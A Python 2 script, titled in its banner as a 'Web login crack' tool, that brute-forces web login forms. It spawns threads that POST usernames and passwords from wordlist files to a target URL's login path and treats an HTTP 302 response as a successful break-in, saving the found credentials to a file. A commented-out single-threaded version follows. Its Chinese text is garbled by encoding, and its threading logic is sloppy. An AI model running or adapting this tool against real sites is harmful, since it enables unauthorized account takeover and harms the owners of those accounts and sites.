#/usr/bin python
# -*- coding: cp936 -*-
import httplib,urllib,sys,os
import threading
import Queue

def info():
    print '''
     
=========================================
                 Web login crack
             uage:xx.py url /login

             WelCome to www.paxmac.org    
 
                         By: ����������ϧ
                           Pax.Mac Team
=========================================
     
    '''
if len(sys.argv) < 3:
    info()
else:
    url=sys.argv[1]
    url2=sys.argv[2]
    info()
    uname_count = len(open('uname.txt','rU').readlines())
    print '����˺�������%d'%(uname_count)
    pwd_count = len(open('pwd.txt','rU').readlines())
    print '�������������%d'%(pwd_count)
    print '�����ƽ�........'

queue=Queue.Queue()#����һ�����ж���

success=[]
class ThreadUrl(threading.Thread):
   def __init__(self,queue):
      threading.Thread.__init__(self)
      self.queue=queue
   def run(self):
       while True:
           try:
               if(Queue.Empty):
                   pwd=self.queue.get()
               else:
                    break
                #IS
               params = urllib.urlencode({'log':LOG,
                          'pwd':pwd})
               headers = {"Content-Type":"application/x-www-form-urlencoded",      
                   "Connection":"Keep-Alive"}
               conn = httplib.HTTPConnection(url)
               conn.request(method="POST",url=url2,body=params,headers=headers)
               response = conn.getresponse()
               if response.status == 302:
                   final="�ƽ�ɹ�!^_^!�˺ţ�%s���룺%s"%(LOG,pwd)
                   print final
                   success.append(final)
               else:
       
                    conn.close()
           except:
                print '���ӳ�ʱ'
           self.queue.task_done()
           
def main():
    for i in range(10):
        t=ThreadUrl(queue)
        t.setDaemon(True)
        t.start()
    names = [line.rstrip() for line in open("uname.txt")]
    pwds = [line.rstrip() for line in open("pwd.txt")]
    for log in names: 
        global LOG
        LOG=''
        LOG=log
        for pwd in pwds:
            p=pwd
            queue.put(p)
        queue.join() 
if __name__ == '__main__':
    main()
    txt=('%s.txt')%(sys.argv[1])
    for x in success:
        file=open(txt,'w')
        file.write(x)
    file.close()

"""
���̰߳�
names = [line.rstrip() for line in open("uname.txt")]
pwds = [line.rstrip() for line in open("pwd.txt")]
result=0
for log in names:
    if result==1:
        break
    for pwd in pwds:
        params = urllib.urlencode({'log':log,
                                  'pwd':pwd})
        headers = {"Content-Type":"application/x-www-form-urlencoded",     
                   "Connection":"Keep-Alive"}
        conn = httplib.HTTPConnection(url,80)
        conn.request(method="POST",url=url2,body=params,headers=headers)    
        response = conn.getresponse()     
        if response.status == 302:      
            print "�ƽ�ɹ�!^_^!�˺ţ�%s���룺%s"%(log,pwd)  
            result=1
            break
        else:      
            print "�ƽ�ʧ��\^0^/�˺ţ�%s���룺%s"%(log,pwd)           
        conn.close()"""
